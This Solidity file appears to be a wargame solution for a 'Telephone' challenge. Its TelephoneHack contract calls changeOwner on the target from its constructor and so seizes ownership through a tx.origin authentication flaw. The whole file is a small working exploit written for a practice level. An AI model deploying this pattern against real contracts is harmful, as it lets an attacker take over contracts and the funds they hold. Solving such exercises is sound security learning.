// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Telephone} from "./Telephone.sol";

contract TelephoneHack {
    Telephone private immutable TARGET;

    constructor(address _target) {
        TARGET = Telephone(_target);
        TARGET.changeOwner(msg.sender);
    }
}
